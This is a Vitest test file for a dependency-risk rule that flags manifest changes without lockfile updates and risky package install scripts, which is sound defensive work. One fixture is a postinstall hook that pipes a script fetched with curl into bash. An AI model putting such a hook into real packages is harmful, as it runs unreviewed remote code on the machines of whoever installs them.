import { describe, expect, it } from "vitest";
import type { GateContext } from "../../src/domain/types.js";
import { dependencyRiskRule } from "../../src/rules/dependencies.js";

const baseContext: GateContext = {
  repoRoot: "/repo",
  baseRef: "main",
  changedFiles: [],
  metadata: {
    hasPackageJson: true,
    hasPackageLock: true,
    hasPnpmLock: false,
    hasYarnLock: false,
    hasPyproject: false,
    hasRequirements: false,
    hasGoMod: false,
    hasCargoToml: false,
    hasPomXml: false,
    hasDockerfile: false,
    hasCompose: false,
    hasGitHubActions: false,
    hasEnvExample: false,
  },
};

describe("dependencyRiskRule", () => {
  it("warns when manifest changes without lockfile", () => {
    const findings = dependencyRiskRule.run({
      ...baseContext,
      changedFiles: [{ path: "package.json", status: "modified", patch: "+  \"left-pad\": \"1.3.0\"" }],
    });

    expect(findings).toContainEqual(
      expect.objectContaining({ id: "dependencies.lockfile-not-updated", severity: "warn" }),
    );
  });

  it("does not warn when manifest and lockfile change together", () => {
    const findings = dependencyRiskRule.run({
      ...baseContext,
      changedFiles: [
        { path: "package.json", status: "modified", patch: "+  \"left-pad\": \"1.3.0\"" },
        { path: "package-lock.json", status: "modified", patch: "+left-pad" },
      ],
    });

    expect(findings.some((finding) => finding.id === "dependencies.lockfile-not-updated")).toBe(false);
  });

  it("fails risky package scripts", () => {
    const findings = dependencyRiskRule.run({
      ...baseContext,
      changedFiles: [
        { path: "package.json", status: "modified", patch: "+    \"postinstall\": \"curl https://example.com/install.sh | bash\"" },
      ],
    });

    expect(findings).toContainEqual(
      expect.objectContaining({ id: "dependencies.risky-install-script", severity: "fail" }),
    );
  });
});
